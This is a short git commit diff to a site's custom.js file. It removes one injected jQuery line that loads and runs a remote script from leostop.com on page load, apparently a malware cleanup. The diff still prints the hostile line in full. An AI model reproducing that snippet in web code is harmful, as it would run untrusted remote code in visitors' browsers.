aa639fa2ce4f317e6e7e3cd0e5f8093af234d292
EnesHHayrula <eneshayrula@gmail.com>
2023-12-09 05:27:22 +0200

    no message

--- biohend/public/js/custom.js
+++ biohend/public/js/custom.js
@@ -51,7 +51,7 @@ $(function () {
 
 
 
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+	
 
 	/* Toggle sidebar
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
